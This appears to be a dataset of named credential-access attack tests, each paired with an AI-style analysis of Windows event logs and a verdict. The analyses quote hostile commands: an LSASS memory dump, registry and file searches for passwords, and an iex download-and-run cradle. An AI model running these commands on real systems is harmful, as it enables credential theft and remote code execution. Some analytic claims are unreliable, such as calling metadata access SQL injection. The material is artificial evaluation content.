  - Investigate how `rdrleakdiag.exe` was placed or used on the host; it might indicate a deeper compromise or misconfiguration.
  - Conduct a thorough credential assessment and reset potentially impacted accounts.
  - Notify internal security teams and, if applicable, relevant third parties of the potential compromise.
- **Further Investigation**:
  - Perform memory analysis on the potentially dumped files for evidence of credential theft.
  - Review other systems in the network for similar indicators or access patterns.
  - Implement enhanced monitoring for anomalous `PowerShell`, `wevtutil.exe`, and privilege usage activities across your Windows environment."
Enumeration for Credentials in Registry,"### Detailed Analysis of the Logs:

**1. Sysmon Log Analysis:**
- **Process Execution:**
  - **Usage of `wevtutil.exe`:** There are multiple instances of the `wevtutil.exe` utility executed by the user ""SERVER002\admin_test"" (EventRecordIDs: 17951, 17955, 17959, 17963, 17967). This utility is legitimate and typically used for managing event logs. However, frequent usage without a clear administrative task could suggest log manipulation attempts.
  
  - **Registry Query Execution:**
    - **Command:** `""cmd.exe"" /c reg query HKLM /f password /t REG_SZ /s & reg query HKCU /f password /t REG_SZ /s` (EventRecordIDs: 17977, 17979, 17986).
    - **Analysis:** This command queries registry keys for entries containing the term ""password"". This is a red flag as it could indicate an attempt to harvest credentials from the registry.
    - **Parent Process:** `wsmprovhost.exe` is a legitimate process, but its involvement indicates the command might have been executed remotely.

- **Execution of PowerShell and Command Tools:**
  - **`whoami.exe`, `hostname.exe`:** These utilities, found in the logs (EventRecordIDs: 17973, 17969), are used to gather information about the system and the currently logged-in user. While not directly malicious, along with other tools, they could indicate reconnaissance activity.
  
  - **`conhost.exe`:** This frequently appears in conjunction with other commands which is typical for console applications. Nothing particularly malicious without context.

**2. Security Log Analysis:**
- **Logons and Privilege Use:**
  - There are multiple logon sessions for the SYSTEM account (EventIDs: 4624, 4672) showing typical service activity, with no evidence of unauthorized logons.
  - Event ID 4798 shows enumeration of user accounts, which can be part of a reconnaissance phase to gather information on users.

**3. Application and System Log Analysis:**
- **Routine Operation:** Logs mainly show regular start and stop activities for services like ""edgeupdate"" and ""Security-SPP."" These entries appear benign and part of routine operations.

**Summary Assessment:**
The logs show signs of potential suspicious activity:
1. Usage of `wevtutil.exe` by a non-system account could suggest log tampering.
2. The registry query for password suggests attempted credential harvesting.
3. Enumerating user accounts could suggest reconnaissance actions.

Given these points and without any more in-depth investigative data, activities seen are **SUSPICIOUS**. Further investigation is recommended to determine intent and scope, focusing on whether these actions were authorized or contextually legitimate administrative tasks. 

### Resolution:
**SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation."
Dump LSASS with createdump.exe from .Net v5,"### Detailed Analysis of Windows Event Logs

#### Overview
The provided logs predominantly consist of Sysmon and PowerShell events from a Windows host (Server002). Our main focus is on the Sysmon event logs indicating new process creations and the PowerShell execution logs. Notably, there are no entries for Application, Security, or System logs, which typically provide additional contextual information.

#### Suspicious and Anomalous Activities

1. **Sysmon Log Analysis:**

   - **Frequent Invocation of PowerShell:**
     - Multiple entries indicate frequent execution of `powershell.exe`, specifically the event with `ProcessId 4700` and later `ProcessId 2124`, executed by the user `SERVER002\\admin_test`.
     - The command line argument associated with `powershell.exe`: 
       ```powershell
       $exePath = resolve-path ""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\script.exe"", & ""$exePath"" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
       ```
     - This command aims to create a dump of the `lsass.exe` process memory, highly indicative of credential dumping activity, which is a common technique used by attackers to extract user credentials from the memory of windows machines.

   - **Execution of `wevtutil.exe`:**
     - `wevtutil.exe` is a command-line utility used to manage event logs and publishers.
     - The frequent execution of this utility (`ProcessIds: 4760, 2268, 5028, 3860, 1864`) can indicate potentially malicious activities like clearing logs to cover tracks.

   - **Regular Usage of `conhost.exe`:**
     - The `conhost.exe` process is seen with varied Process IDs (e.g., 5556, 4828, 4716). This might be due to console windows spawned by other processes but in conjunction with other suspicious activities, it could point to malicious actions like privilege escalation attempts.

2. **PowerShell Log Analysis:**

   - **References of Credential Dumping Code:**
     - The command executed in PowerShell logs matches exactly with the suspicious command seen in Sysmon logs.
     - This PowerShell command is specifically engineered for manipulating and creating dumps of `lsass`, suggesting a planned attempt to extract sensitive credential information.

#### Conclusion

Based on the analysis above, especially considering the credential dumping attempts involving `lsass.exe`, frequent use of `wevtutil.exe` potentially to manipulate event logs, and no supporting benign logs that suggest intentional administrative activities, the activities observed in the logs are highly anomalous and potentially aligned with malicious intent.

### Resolution: MALICIOUS

#### Guidance on How to Proceed

1. **Immediate Actions:**
   - Quarantine the affected host (Server002) from the network to prevent further potential lateral movement.
   - Inspect other systems that may have been accessed from the compromised host.

2. **In-depth Investigation:**
   - Conduct forensic analysis on `Server002`, focusing on `PowerShell` activity, event logs particularly around the IP traffic for any outbound connections or data exfiltration.
   - Examine user account `SERVER002\\admin_test` for unauthorized access or privilege abuse.

3. **Enhance Security Measures:**
   - Implement tighter monitoring and alerting for the execution of PowerShell scripts containing known malicious techniques.
   - Strengthen endpoint defenses and ensure proper logging and SIEM (Security Information and Event Management) configurations are applied.

4. **Remediation:**
   - Review and potentially change credentials and tokens that might have been exposed.
   - Patch known vulnerabilities and enhance the overall security posture to prevent future incidents."
PetitPotam,"Upon reviewing the provided event logs, several factors warrant attention and suggest potential suspicious or malicious activity. Here's a breakdown of the findings:

1. **PowerShell Activity:**
   - There are entries in the Sysmon logs and PowerShell logs that involve the execution of PowerShell scripts, notably from a temporary file path `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe""`.
   - The script appears to connect to IP addresses `10.0.0.3` and `10.0.0.2`. Such behavior could be indicative of command-and-control (C2) communication or data exfiltration attempts.

2. **Usage of `wevtutil.exe`:**
   - Multiple Log entries indicate the execution of `wevtutil.exe` by `SERVER002\\admin_test`. `wevtutil.exe` is a utility that can be used to clear Windows event logs. Frequent use of this tool in a short timeframe might suggest an attempt to cover tracks.

3. **Multiple Instances of `conhost.exe`:**
   - Sysmon logs reflect various instances of `conhost.exe` spawned, which often accompanies PowerShell execution. While `conhost.exe` itself is a legitimate and necessary process, abnormal usage patterns can associate it with obfuscation techniques used in PowerShell-based attacks.

4. **High Integrity Level and Admin User:**
   - Processes, particularly `powershell.exe` and `conhost.exe`, are executed under a high integrity level by the user `SERVER002\\admin_test`. This indicates the activity had administrative privileges, increasing potential risk if malicious activity is confirmed.

5. **Execution of Scripting/Exploitation Components:**
   - The execution path of the PowerShell script suggests the potential use of exploitation frameworks, as scripts are executed from temporary directories with obfuscated paths often linked to payloads that could bypass antivirus systems.

6. **Edge Update Anomaly:**
   - There are legitimate updates related to Microsoft Edge, though without any explicit signs of tampering from these entries alone. However, reviewing any false positives or overlapping traffic might be prudent.

Based on these observations, while the PowerShell activity involving external IP addresses and obfuscated script execution paths raises significant concerns, additional investigation would be needed to verify intent and potential compromise specifics. However, the combination of administrative PowerShell usage, the execution of software typically linked with attempts to evade logging or detection (like `wevtutil.exe`), and suspicious script execution suggests potential malicious behavior.

**Resolution: SUSPICIOUS**

**Guidance:**
- Investigate the external communication involving the PowerShell script to confirm any unauthorized or intended connections.
- Examine any security solutions logs for context around the time of the entries, specifically focusing on endpoint security events.
- Review user activity on the system by `SERVER002\\admin_test` and scrutinize executed documents or files in identified directories.
- Engage incident response to determine broader indicators of compromise or active threats if initial investigation confirms suspicions."
"Registry dump of SAM, creds, and secrets","Upon reviewing the provided Windows event logs, here's the detailed analysis:

1. **Logon Events:**
   - The Security log shows Event ID 4624, indicating a successful logon. The logon is type 5 (service), initiated by ""Advapi"" using the ""Negotiate"" package, and executed by ""C:\Windows\System32\services.exe"". This event by itself is typical for system operations.
   - Event ID 4672 shows special privileges being assigned to the ""SYSTEM"" account, including privileges like SeDebugPrivilege. While SYSTEM has these privileges, this action could potentially be leveraged for malicious intent if triggered by an unauthorized user.

2. **Process Execution:**
   - Sysmon logs show several process creations, with a focus on a sequence involving command line tools such as `whoami.exe`, `hostname.exe`, `cmd.exe`, and `reg.exe`.
   - The execution of `whoami.exe` and `hostname.exe` seems to be regular activities to query system information and by itself is not inherently suspicious.
   - However, the command `cmd.exe` execution with arguments to save registry hives using `reg.exe` (saving SAM, SYSTEM, and SECURITY hives) is more concerning. This action suggests an attempt to access sensitive system files which store critical information including password hashes, often associated with credential dumping.

3. **Potential Indicators of Malicious Activity:**
   - The usage of `reg.exe` to save registry hives (`HKLM\sam`, `HKLM\system`, `HKLM\security`) into temporary files.
   - The command line `cmd.exe` usage suggests potential unauthorized access or testing of privilege escalation as it attempts to save registry hives. This type of behavior is commonly seen in certain malware and hacking toolkits aiming for credential theft and system exploitation.

4. **Further Observations:**
   - The presence of event `ID 5` in Sysmon logs associated with `reg.exe` does not often immediately indicate malicious actions on its own but supports analysis of potentially malicious command sequences.
   - The integrity level of involved processes is high, executed under the context of ""SERVER002\admin_test"" which implies an administrator privilege level, further adding to the concern over the unauthorized administrative level actions.

### Assessment
Based on the findings, the execution of commands with potential credential dumping capabilities combined with high privileges indicates a security risk.

### Resolution: SUSPICIOUS

Given the nature of the logs, especially the registry hive save commands, this activity is classified as SUSPICIOUS. It doesn't definitively confirm malicious activity but suggests strong indicators warranting deeper investigation. 

### Guidance:
1. **Immediate Action**: Isolate the host to avoid possible data exfiltration or lateral movement.
2. **Investigation**: Conduct a detailed forensic analysis of the host to determine the origin of these commands and whether they were executed by an authorized user or malicious software.
3. **Review**: Inspect any related logs around the time of these events for potential intrusion points.
4. **Security Measures**: Ensure no unauthorized access persists and consider enhancing monitoring and security controls to detect similar activities in the future."
GPP Passwords (findstr),"Upon analyzing the provided event logs from the Windows machine, here are the findings:

1. **Security Log Analysis**:
   - Event IDs 4616 indicate a change in system time. These logs show the process `svchost.exe` changing the system time, which might be a routine operation or part of legitimate system maintenance activities. Nothing unusual stands out from these entries.

2. **Application Log Analysis**:
   - The Application logs contain entries related to the `edgeupdate` service stopping. This event could be benign, related to routine application maintenance or updates, particularly when dealing with Microsoft's Edge browser updates.

3. **Sysmon Log Analysis**:
   - There are several entries involving processes like `powershell.exe` and `cmd.exe`. Notably, the command line for `cmd.exe` includes `findstr /S cpassword %%logonserver%%\sysvol\*.xml`, which is suspicious. This command potentially attempts to locate Group Policy Preferences (GPP) files with stored credentials, a known tactic in gathering plaintext credentials in a network.
   - A number of `MicrosoftEdgeUpdate.exe` processes are active, some of which are run from a temporary directory. While this activity might relate to normal software updates, the frequency and multiple instances, coupled with temporary path execution, are unusual and warrant further investigation to rule out misuse of update mechanisms for malicious purposes.

4. **System Log Analysis**:
   - Events in the system logs appear to focus on time synchronization and other time service activities. The changes in system time, while they need careful consideration, do not seem to tie directly to immediate malicious activities on their own without additional context or evidence suggesting active tampering or synchronizations influencing log timelines.

**Assessment and Guidance**:

- **SUSPICIOUS**:
   - The execution of a `findstr` command searching for `cpassword` in SYSVOL is particularly concerning as it suggests an attempt to acquire sensitive information from GPP files. Investigating why PowerShell and CMD are executing these commands is crucial to understand if they were initiated by a user or an automated malicious script.
   - The numerous instances of `MicrosoftEdgeUpdate.exe` processes, especially those triggered from temporary directories, are suspicious. It is essential to confirm these are legitimate updates and not a guise for malicious software execution or updates being hijacked to include unauthorized content.

**Next Steps**:
- Conduct a deeper investigation into the purpose and origin of the PowerShell and CMD activity, focusing on user actions, scheduled tasks, or automated deployments that may have triggered such behavior.
- Verify the integrity and source of the `MicrosoftEdgeUpdate.exe` processes, ensuring they have not been manipulated or replaced by malicious actors.
- Cross-reference any findings with threat intelligence on possible exploitation methods corresponding to the suspicious behaviors observed.
- Consider deploying endpoint protection and increasing monitoring on the affected host, checking for unusual outgoing traffic that could suggest data exfiltration, especially if sensitive information could be compromised through the identified activities."
WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,"### Analysis:

Let's analyze the logs from each category:

#### System Log:
1. **Time Changes**:
   - There are multiple entries indicating time adjustments by `svchost.exe`, which is a legitimate service used by Windows. It adjusts time settings according to the network time protocol, particularly aligning with time.windows.com.
   
2. **Events from System Time Validations**:
   - There doesn't seem to be anything abnormal as they are part of the normal operation of syncing system time with NTP servers.

#### Windows PowerShell Log:
1. **Suspicious PowerShell Execution**:
   - We see a PowerShell execution using `iex` (Invoke-Expression) and `new-object net.webclient` to download and execute a script directly from a URL (`https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1`).
   - This activity is highly suspect in a secure environment, as it allows for arbitrary script execution, which is a common method used by attackers to introduce malware or execute unauthorized scripts.

#### Security Log:
- The events largely cover system time change notifications without unusual privilege escalations or unauthorized account actions.

#### Sysmon Log:
1. **Processes of Interest**:
   - Execution of `powershell.exe` with downloading capabilities is observed. This is aligned with the suspicious activity observed in the PowerShell logs.
   - The command line and file hashes indicate potential use of PowerShell to download and execute scripts from the internet, known behavior for malicious operations.
   
2. **Regular Microsoft System Process Activity**:
   - Legitimate system processes like `svchost.exe`, `wevtutil.exe`, `MicrosoftEdgeUpdate.exe` are running. These are standard but could potentially mask malicious activities if any were well-camouflaged. In this context, they appear routine and not immediately suspicious.

#### Application Log:
- Regular logs showing `Windows Defender` is enabled and active.
- `Microsoft Edge` update service stops are noted, which align with possible legitimate updates.

### Assessment:

- The **PowerShell activity**, especially downloading and executing scripts, is a significant indicator of suspicious activity. This is a common technique for script-based attacks, seen frequently in the form of initial malware downloads.
- The rest of the system and application logs suggest regular behavior typically seen during normal operations, minus any detected changes in privilege levels or account misuses, except for potential exploitation of PowerShell.

### Conclusion:

Given the overall evidence, the behavior observed within the PowerShell logs is categorized as **SUSPICIOUS**. This activity should be further investigated to rule out an incursion, especially since it involves executing potentially harmful scripts downloaded from the internet without clear authorization. 

### Guidance on How to Proceed:

   - Examine the downloaded script's content and behavior, potentially sandbox it to understand its actions in a controlled environment.

3. **Remediation**:
   - Restrict PowerShell execution policies to disallow running downloaded scripts without prior vetting.
   - Educate users on recognizing phishing attempts and risky behaviors, particularly regarding script execution.

4. **Long-Term Measures**:
   - Strengthen network security measures such as firewalls, IDS/IPS, and utilize application whitelisting.
   - Ensure that systems are patched and security settings follow the organization's best practices."
WinPwn - passhunt,"Upon review and analysis of the provided Windows event logs, the following observations have been made:

### System Log:
1. **System Time Changes:** 
   - There are events indicating changes in the system time. Adjustments to the system time can occasionally signify timestamp manipulation to obscure activity. However, in this context, adjustments seem negligible (milliseconds) and stem from a system service (`svchost.exe`), often managing legitimate system processes.

### Application Log:
1. **Windows Defender Status:**
   - The entries show Windows Defender as active (""SECURITY_PRODUCT_STATE_ON""), suggesting that endpoint protection is functioning correctly at the time of logging.

### Sysmon Log:
1. **Process Execution:**
   - Numerous routine processes are observed such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `HOSTNAME.EXE`, which are typically benign.
   - However, there is a particularly noteworthy instance of `powershell.exe` executing a script from a remote URL. This indicates:
     - **PowerShell Command Execution:** 
       - The execution of a PowerShell script hosted on an external server (`https://raw.githubusercontent.com/script/...`) using the `iex(new-object net.webclient).downloadstring(...)` command. This pattern often reflects potentially malicious activity as it can be used to execute scripts without saving them to disk. 
       - The use of download and execute (passhunt) implies a reconnaissance or data-gathering phase of an attack.

### PowerShell Log:
- **PowerShell Invocation:**
  - The logs reflect the invocation of a PowerShell script consistent with the Sysmon log entry indicating execution from an external source. This supports the suspicion of unauthorized or malicious script execution.

### Security Log:
1. **User Activity:**
   - Successful logons for user `admin_test` are observed using NTLM, reflecting legitimate usage under normal conditions.
   - Privilege elevation activities and several high-level privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) being present for the `admin_test` user can be normal for an admin account but following recent PowerShell activity, it warrants further scrutiny.

### Assessment:
The sequence of events involving:
- Execution of a PowerShell command that downloads and runs a script from an external source without a clear business justification.
- The privileges available to the `admin_test` account, coupled with the PowerShell script execution, suggest potential misuse or compromise.

### Resolution:
- **SUSPICIOUS** - The logs contain activity that does not seem typical or authorized and requires further investigation to confirm or eliminate the potential for malicious intent.

### Recommended Actions:
1. **Immediate Containment Measures:**
   - Temporarily isolate the machine (`Server002`) from the network to prevent any spread or further unauthorized activity.
2. **Investigate PowerShell Activity:**
   - Analyze the content and intent of the downloaded PowerShell script if accessible.
3. **User Activity Review:**
   - Verify the legitimacy of the actions and activity around the `admin_test` account, including authentication sources and recent changes.
4. **Security Audit:**
   - Perform a comprehensive security audit to identify and mitigate any further unauthorized changes or security gaps.
5. **Network Analysis:**
   - Examine network logs to trace communications to and from the machine, particularly around the time of the suspicious PowerShell activity.
6. **Endpoint Security Checks:**
   - Ensure endpoint protection systems (like Windows Defender) are fully operational and updated, and perform a full malware scan.

Further investigation will help determine whether malicious activity has indeed taken place and guide subsequent remediation steps."
Search for Passwords in Powershell History,"In the analysis of the provided Windows event logs, several entries need to be evaluated for potential indicators of malicious activity:

1. **Time Change in Event Logs (Security & System Logs)**:
   - Security Event ID 4616 and System Event IDs 24 & 1 indicate a time change. While it's common for systems to synchronize time, frequent or unauthorized time changes can be suspicious as attackers might alter system times to hide their activities. However, the time adjustment here seems minimal and appears on legitimate system processes, such as `svchost.exe`, which is typical for time synchronization with NTP servers.

2. **Process Execution (Sysmon Logs)**:
   - The execution of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` with command `ls -R C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String ""password"", ""-p"", ""key"", ""pwd"", ""pass""` is suspicious. The command is searching for sensitive keywords (""password"", ""key"", etc.) in PowerShell history, which may indicate a password harvesting attempt.
   - The frequent execution of `MicrosoftEdgeUpdate.exe` and related processes suggests legitimate system updates for Microsoft Edge. The processes are run by `NT AUTHORITY\SYSTEM`, a legitimate use for updating system components.

3. **PowerShell Activity (Windows PowerShell Logs)**:
   - The PowerShell events capture the same suspicious command involving search for passwords. This command-level detail, encapsulated in EventID 600, indicates potential internal reconnaissance.

4. **Microsoft Edge Update**:
   - Extensive logs related to Microsoft Edge updates, such as starting and stopping of services, indicate update activities. These appear routine and consistent with regular application update tasks.

**Overall Assessment**:
- The command executed through PowerShell searching for password-related content in user directories is the primary suspicious activity identified in these logs.
- The Microsoft Edge Update operations seem legitimate and expected as part of routine software updates.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Further investigation is recommended into who initiated the PowerShell command searching for passwords and the context for its execution. This action could indicate an attempt to harvest credentials which warrants a closer look.
- Verify if the PowerShell script execution is a known administrative activity. If not, it may signal unauthorized access or malicious internal reconnaissance.
- Conduct a security review of user accounts, privilege access, and audit trails related to this activity.
- Continuously monitor and alert upon similar behavior and set up alerts for PowerShell logging of suspicious commands.

This concludes our initial review, highlighting the need for deeper investigation due to the potentially harmful use of PowerShell."
Azure - Dump All Azure Key Vaults with Microburst,"Upon analyzing the provided Windows event logs, several findings indicate potentially malicious behavior. Below is the detailed analysis:

### Anomalies and Suspicious Behavior Identified:

1. **Unusual PowerShell Activity**:
   - Multiple Windows PowerShell logs indicate the execution of potentially harmful scripts. Particularly, the script being executed attempts to import a module and retrieve Azure passwords (`Get-AzurePasswords.ps1`) using hardcoded plaintext strings.
   - The command executed is attempting to connect to Azure with provided credentials and manipulate data into text files within a temporary directory (`dataTest1.txt`).

2. **High Privilege and Privilege Abuse**:
   - Event ID 4672 in the Security log shows a privileged logon session for user `admin_test` with sensitive privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These privileges are often targeted for misuse as they can allow modification and takeover of processes and resources.
   - The use of these privileges with no apparent legitimate purpose, especially in combination with PowerShell scripts accessing sensitive information, raises concerns.

3. **NTLM Authentication**:
   - Event ID 4624 logs the use of NTLM authentication from a remote workstation. While not inherently suspicious, combined with unusual activities, it can suggest unauthorized access attempts potentially exploiting cached credentials.

4. **Questionable Executable Execution**:
   - Sysmon logs show the execution of various Microsoft .NET applications (`csc.exe`, `cvtres.exe`) linked to potential compilation or transformation activities on the system. This could represent attempts to create or execute disguised malicious applications or scripts.

5. **Consistency with Known Attack Patterns**:
   - The combination of obtaining Azure credentials, PowerShell script usage, and suspicious execution privileges align with known credential theft and lateral movement attack patterns.

### Assessment:

The combination of high-privileged command execution attempting to access cloud credentials and insecure command-line argument use strongly suggests malicious activity. These activities are common in credential harvesting and further system infiltrations.

### Resolution: MALICIOUS

**Actions Recommended**:
1. **Immediate Incidence Response**: Initiate a thorough investigation, isolate the system, and prevent further data exfiltration.
2. **Credentials Audit**: Reset credentials related to this user account and any potentially exposed Azure accounts.
3. **Comprehensive Threat Hunt**: Expand the scope of threat hunting to identify further potential compromises within the network.
4. **Enhance Monitoring**: Implement stricter monitoring and alerting mechanisms for PowerShell script executions and privilege escalations in logs.
5. **Patch and Secure Configurations**: Ensure all systems are updated, and security settings are adequately configured to prevent privilege abuse.

The logs indicate signs of a targeted attempt to gather sensitive information, which constitutes malicious activity. Steps should be taken to mitigate the threat and prevent further incidents."
Simulating access to Windows Firefox Login Data,"Upon analyzing the provided Windows event logs, several entries stand out that suggest suspicious or potentially malicious activity. Below is a detailed assessment of the findings:

1. **PowerShell Activity:**
   - A series of PowerShell events (EventID 600) reveal the use of a PowerShell command to copy files from the Mozilla Firefox Profiles directory to a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles`). 
   - This kind of activity typically indicates data exfiltration or unauthorized access and copying of user data without permission. The usage of environment variables (`$env:APPDATA`) further obfuscates the command, making the activity less noticeable.

2. **Security Log:**
   - The Security log shows an Event ID 4624, which represents a successful logon. However, it doesn't immediately appear suspicious, as it uses known system accounts (SYSTEM and NT AUTHORITY).
   - Event ID 4672 shows the granting of special privileges to the SYSTEM account, which includes several potentially high-risk privileges such as SeDebugPrivilege and SeTakeOwnershipPrivilege. In the context of other activities, this may be part of privilege escalation tactics.

3. **Sysmon logs:**
   - The execution of various processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` by the user `SERVER002\admin_test` is noteworthy, especially given that these occur in close succession.
   - The repeated use of `wevtutil.exe` could suggest attempts to query or manipulate event logs, which is a common tactic to erase indicators of compromise.
   - The execution of `whoami.exe` and `hostname.exe` may indicate attempts to establish the current user context and machine identity, potentially as part of reconnaissance activities.

**Assessment and Conclusion:**
- The combination of unauthorized file copying via PowerShell, the execution of processes that can be used to cover tracks (e.g., `wevtutil.exe`), and the high-risk privileges granted to SYSTEM are strong indicators of suspicious intent.
- These actions align with common tactics used in malicious activities, such as data exfiltration, privilege escalation, and log manipulation.

**Resolution: SUSPICIOUS**
- While the evidence significantly leans towards malicious intent, it lacks definitive proof without further context and corroborating data, such as network traffic analysis or endpoint detection information. Therefore, the activity is categorized as SUSPICIOUS and warrants further investigation.
   
**Guidance on How to Proceed:**
- Conduct a thorough review of the affected host and correlate these findings with network logs and any relevant intrusion detection systems to determine if data was exfiltrated.
- Review changes to user permissions and recent login activities to identify potential unauthorized access and privilege escalation.
- Implement tighter control and monitoring of PowerShell and other script execution on sensitive systems.
- Engage with incident response for potential containment and eradication activities to ensure that any intrusion is effectively mitigated."
Azure - Dump Azure Instance Metadata from Virtual Machines,"Upon reviewing the provided Windows event logs, we will analyze each type of log source for any suspicious or malicious indicators.

### Security Log Analysis:
- **Event 4616**: These events show changes in the system time using `svchost.exe`. Time changes can sometimes indicate an attempt to alter logs or hide activity, but without additional context, this alone isn't enough to deem it suspicious as `svchost.exe` is a legitimate process and often interacts with system time settings.

### System Log Analysis:
- Events from the Kernel-General and Time-Service reflect system time changes and the synchronization processes using `time.windows.com`. These are normal activities aligning with the observed Security log events and typically do not indicate malicious activity.
  
### Windows PowerShell Log Analysis:
- The presence of PowerShell activities involving the `Invoke-RestMethod` to access metadata from a local IP address (`169.254.169.254`) is highly suspicious. This IP is commonly used in cloud service providers like AWS for instance metadata. The use of this in PowerShell scripts indicates SQL injection or reconnaissance, which can be a sign of compromise if the system is not expected to perform such activities.

### Sysmon Log Analysis:
- **Process Creation (EventID 1)**: Observations include `whoami.exe`, `conhost.exe`, and `powershell.exe` processes. The `whoami.exe` process executions are typical for a user querying their session details. However, the PowerShell script detailed in the Powershell logs, reinforced here, is a red flag.
- **File Events (EventID 5)**: Instances of `wevtutil.exe` could point to event log queries or manipulations. However, the frequent creation of this process is a regular occurrence in various sysadmin scripts or system activities and not enough alone to suggest malicious activity without further specific command-line evidence.

### Application Log Analysis:
- An entry from `Software Protection Platform Service` is observed but appears benign and related to regular licensing checks inherent in Windows OS.

### Conclusion:
The most critical component in the provided logs is the PowerShell script execution, particularly the `Invoke-RestMethod` retrieving metadata. This action is inconsistent with most internal desktop or server operations unless dealing with cloud infrastructure operations which should be closely monitored and explicitly authorized.

### Assessment & Resolution:
Based on the analysis:
- **Resolution: SUSPICIOUS**
  - The logs indicate suspicious PowerShell activity that warrants further investigation. This script execution could potentially be part of a malicious reconnaissance or initial access vector in a cloud environment. Immediate investigation should include:
    - Validating if the machine is a known cloud-based instance and if this access pattern aligns with any known legitimate operations.
    - Reviewing network logs for further unexpected outbound connections.
    - Examining recent account and system changes for potential unauthorized access.

This assessment strongly recommends deeper scrutiny and validation with asset management and network activity to confirm legitimacy and mitigate potential threats."
Access unattend.xml,"### Analysis of the Logs:

1. **Microsoft Edge Update Execution:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` were executed from expected locations under NT AUTHORITY\SYSTEM. While typically benign, the execution from `C:\Program Files (x86)\Microsoft\Temp\EU6111.tmp` may warrant further investigation to ensure it is not a surrogate for malicious activity. Edge updates can execute from temp directories, but verification of recent updates from Microsoft should be conducted.

2. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The repeated execution of `wevtutil.exe` suggests event log management or querying. This coupled with `conhost.exe` (Console Window Host) executions might indicate attempts to manage or clear event logs to cover tracks. The usage by `SERVER002\admin_test` and the high integrity level suggest elevated privileges, which could be suspicious in the context if this was not a scheduled activity by an admin. 

3. **Execution of `cmd.exe` with Specific Commands:**
   - `cmd.exe` is executed with the command to read files from `C:\\Windows\\Panther\\unattend.xml` and `C:\\Windows\\Panther\\Unattend\\unattend.xml`. This action is unusual for regular users, as these files can contain sensitive information such as system setup instructions or configuration data. 

4. **Time Synchronization Events:**
   - The system time appears to have been altered, as evidenced by security logs `EventID: 4616`. While sometimes normal in server environment updates, such changes should be validated as intentional and not attempted obfuscation of malicious activity timestamps.

5. **Standard Processes Executed:**
   - Normal system processes like `svchost.exe`, `sppsvc.exe`, and `whoami.exe` were executed. These typically are expected and not indicative of compromise unless in anomalous contexts—which doesn't seem to be the case in these logs.

### Assessment:
Based on the analysis, there are indicators that suggest further investigation:
- Execution of `wevtutil.exe` and `conhost.exe` repeatedly by a specific user account with high integrity context.
- Unconventional execution paths for `MicrosoftEdgeUpdate.exe`.
- Use of `cmd.exe` to access sensitive file paths, which could expose valuable information.

### Resolution:
**SUSPICIOUS**

### Guidance:
- Corroborate system admin account activities to verify any planned log manipulations.
- Verify recent updates and execution paths concerning the Microsoft Edge Update for legitimacy.
- Investigate the purpose of accessing `unattend.xml` and if there’s any unauthorized data exfiltration or misuse.
- Review who accessed or modified system time to ensure there are no illicit efforts to obscure activity logs.
- Continue monitoring and potentially escalate with full forensic analysis if any further suspicious activities are confirmed."
Extracting passwords with findstr,"After analyzing the provided Windows event logs from various channels, here's the assessment of the situation:

### Assessment:

1. **System Logs**:
   - No suspicious activities are observed in the System logs. The logs primarily contain kernel events related to time changes, which are typical system operations.

2. **Windows PowerShell Logs**:
   - The logs indicate PowerShell activity that contains a command: `powershell.exe & {findstr /si pass *.xml *.doc *.txt *.xls; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password}`.
   - This command is attempting to search files with potential password mentions, an activity that can indicate malicious intent or probing by a user/attacker.

3. **Sysmon Logs**:
   - Multiple executions of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and others indicate normal system activities.
   - However, the presence of the `whoami.exe` and PowerShell execution confirms the earlier suspicion from the PowerShell logs.
   - PowerShell execution details correspond to the suspicious PowerShell activity detailed above.

4. **Application Logs**:
   - Logs related to Microsoft Edge updates show services started and stopped, which seem like regular maintenance or update activities.

5. **Security Logs**:
   - Routine security events such as logon events and elevated token assignments are observed.
   - No unauthorized access or privilege escalation is detected in the provided logs.

### Identified Threats or Risks:
- The key indicator of potential compromise here is the PowerShell command which is suspicious and not typical of regular system administration tasks. It suggests that someone attempted to scrape files for sensitive information such as passwords.

### Resolution:
- **Resolution: SUSPICIOUS**

The PowerShell activity is suspicious and warrants further investigation. It's critical to:
- Cross-reference these system logs with network logs to check for any outbound connections associated with this activity.
- Check user activities, especially of the user running the PowerShell command, to determine if this was authorized or necessary.
- Ensure up-to-date antivirus/anti-malware solutions are assessing this machine.
- Conduct a broader search for indicators of compromise across endpoints to check if this activity is isolated or part of a larger issue.

Further investigation is needed to either confirm malicious activity or to rule out any threat."
List Credential Files via PowerShell,"Upon reviewing the provided Windows event logs, several patterns and events stand out that warrant attention:

### Key Observations:

1. **PowerShell Activities:**
   - **Windows PowerShell Logs:** There are multiple PowerShell events indicating the execution of a script attempting to access hidden files in the user’s credentials directories.
   - **Command Executed:** The executed PowerShell script seems to be accessing sensitive directories: `C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\` and `C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\`. This can be an attempt to gather credential information, which is suspicious and potentially malicious behavior.

2. **System Service and Time Change Events:**
   - **System Logs and Security Logs:** Numerous entries involving `svchost.exe` seem to indicate normal time adjustments by the Windows Time Service. There are no clear signs that these adjustments are associated with a malicious activity.

3. **Edge Update Activities:**
   - **Sysmon Logs:** A significant number of entries are related to Microsoft Edge Update services. While the execution of `MicrosoftEdgeUpdate.exe` and associated .exe files is normal behavior for update processes, the extensive number of entries could obscure other events and should be monitored for excessive behavior.
   
4. **Admin Test Account Activities:**
